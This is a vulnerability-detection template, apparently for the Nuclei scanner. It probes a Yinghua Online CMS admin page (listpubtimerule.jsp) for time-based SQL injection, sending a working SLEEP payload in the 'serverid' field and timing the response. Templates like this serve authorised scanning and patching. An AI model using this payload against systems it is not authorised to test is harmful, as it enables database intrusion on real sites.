id: yinghuaonline-listpubtimerule-jsp-sqli

info:
  name: 英华学堂 listpubtimerule.jsp SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: '{{rand_int(2,5)}}'
  t2: '{{to_number(t1) + to_number(t1)}}'
  t3: '{{to_number(t2) + 2}}'

http:
  - method: POST
    path:
      - '{{BaseURL}}/cms/cmsadmin/pub/listpubtimerule.jsp'
    headers:
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    body: "serverid=' AND (SELECT 8490 FROM (SELECT(SLEEP({{t1}})))iIeJ) AND 'VXvO'='VXvO"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "listpubtimerule"
          - "定时发布规则"
          - "规则名称"
      - type: dsl
        dsl:
          - 'duration > to_number(t2)'
          - 'duration < to_number(t3)'
